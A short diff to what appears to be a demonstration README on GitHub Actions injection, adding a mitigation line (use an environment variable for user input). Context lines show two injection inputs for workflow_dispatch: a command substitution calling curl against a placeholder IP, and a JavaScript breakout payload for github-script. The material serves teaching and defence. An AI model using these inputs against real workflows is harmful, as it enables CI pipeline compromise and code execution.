@@ -25,3 +25,6 @@ Use the following as input for workflow_dispatch: `$(curl {IP}:8080)`
 
 # Exploit 2a: Using user input in github-script action
 Use the following as input for workflow_dispatch: `};console.log('hophophop!!!');//`  
+
+# Mitigation
+Use an environment variable for the user input.
